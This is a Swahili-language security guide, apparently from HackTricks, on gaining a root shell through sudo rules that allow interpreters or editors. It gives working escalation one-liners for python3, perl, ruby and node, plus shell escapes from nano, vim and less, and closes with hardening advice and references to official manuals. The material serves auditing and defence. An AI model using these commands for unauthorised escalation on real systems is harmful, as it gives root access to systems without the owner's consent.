# Matumizi Mabaya ya Amri ya Sudo

## Interpreters zinazoruhusiwa na Sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha interpreter kama root, ichukulie kama direct code execution. Interpreters zimeundwa kutekeleza code kiholela, kwa hivyo rule inayoruhusu `python3`, `perl`, `ruby`, `lua`, `node`, au binaries zinazofanana kwa kawaida ni sawa na kutekeleza commands za root, isipokuwa arguments zimewekewa mipaka na kuthibitishwa kwa umakini.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Mtiririko wa kawaida wa ukaguzi: kwanza orodhesha privileges za mtumiaji, kisha tekeleza statement ya Python kwa kutumia option ya interpreter ya `-c`.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Mifano mingine ya interpreters imeonyeshwa hapa chini; interpreters zilizoorodheshwa zinaandika kuhusu utekelezaji wa inline-code au APIs za child-process.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Njia kamili ni muhimu. Ikiwa sheria ya sudo inaruhusu `/usr/bin/python3`, tumia njia hiyo kamili wakati wa uthibitishaji.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors zinazoruhusiwa na Sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha editor ya maingiliano kama root, ichukulie kama sehemu ya kutekeleza command, si ruhusa isiyo na madhara ya kuhariri faili. Mara nyingi editors zinaweza kutekeleza shell commands, kusoma faili zozote, kuandika faili zozote, au kuita external helpers kutoka ndani ya editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Mtiririko wa kawaida wa ukaguzi: orodhesha privileges za mtumiaji, kisha invoke kila editor au pager iliyoruhusiwa kwa kutumia sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Utekelezaji wa amri wa Nano

Wakati `nano` inaruhusiwa kupitia sudo, utekelezaji wa amri unaweza kufikiwa kutoka kwenye interface ya editor.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Kisha toa amri kama vile `id` au `/bin/sh` kwenye kidokezo cha amri cha nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Ikiwa interactive shell haina terminal streams zinazoweza kutumika, muundo huu wa redirection huweka standard output na error yake kwenye descriptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Mfuatano halisi wa vitufe unaweza kutofautiana kulingana na toleo la nano na chaguo za build, lakini suala la usalama ni lilelile: kihariri kinaendeshwa kama root na kinaweza kutekeleza amri za nje.<sup>[[1]](#references)[[12]](#references)</sup>

### Njia nyingine za kawaida za kutoka kwenye vihariri

Vihariri vya mtindo wa Vim kwa kawaida hutoa utekelezaji wa amri kupitia `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Pagers kama `less` zinaweza pia kuwezesha shell execution.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Maelezo ya kujilinda

- Epuka kutoa interpreters au interactive editors kupitia sudo.<sup>[[1]](#references)</sup>
- Pendelea wrappers zilizowekwa na root zinazotekeleza kitendo kimoja mahususi cha kiutawala.<sup>[[1]](#references)[[2]](#references)</sup>
- Ikiwa interpreter haiwezi kuepukika, zuia exact script path na uzuie user-controlled arguments, writable imports, `PYTHONPATH`, pamoja na unsafe environment preservation.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Ikiwa file editing inahitajika, zuia exact file path na zingatia `sudoedit` ukiwa na patched sudo versions na strict environment handling.<sup>[[1]](#references)[[2]](#references)</sup>
- Kagua `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, na logging, lakini usizichukulie kama sandbox kamili.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — nyaraka za Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — interfaces mbalimbali za mfumo wa uendeshaji — nyaraka za Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — jinsi ya kuendesha Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — nyaraka za Perl](https://perldoc.perl.org/functions/exec)
- [7] [Chaguo za command line za Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — nyaraka za Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — nyaraka za Node.js](https://nodejs.org/api/cli.html)
- [10] [Child process — nyaraka za Node.js](https://nodejs.org/api/child_process.html)
- [11] [Ukurasa wa man wa Lua 5.4 lua](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
